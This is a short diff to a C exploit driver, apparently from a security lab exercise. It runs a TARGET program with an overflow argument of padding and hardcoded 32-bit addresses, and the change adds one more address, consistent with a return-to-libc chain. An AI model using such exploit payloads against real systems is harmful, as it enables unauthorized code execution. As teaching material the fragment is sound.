@@ -13,7 +13,7 @@ int main(void)
   char *env[1];
   
   args[0] = TARGET;
-  args[1] = "AAAAAAAA\xb0\x2d\xe4\xb7\x2b\x3b\xf6\xb7"; 
+  args[1] = "AAAAAAAA\xb0\x2d\xe4\xb7\xe0\x69\xe3\xb7\x2b\x3b\xf6\xb7"; 
   args[2] = NULL;
   
   env[0] = NULL;
